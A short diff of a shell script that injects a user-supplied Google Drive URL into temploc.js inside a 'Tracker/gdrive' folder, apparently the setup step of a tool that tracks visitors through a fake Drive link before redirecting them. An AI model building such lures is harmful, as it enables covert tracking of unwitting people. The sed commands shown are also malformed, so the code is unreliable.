@@ -35,7 +35,7 @@ gdrive(){
 
     read -p ">> Enter Google Drive File URL: " gdriveurl  #receiving replaceable drive url
     cd Tracker/gdrive
-    sed -i "s/oldurl/$gdriveurl" index.html
+    sed -i "s/REDIRECT_URL/$gdriveurl" temploc.js
     echo "Success, Google Drive url injected.."
     echo "."
     echo "."
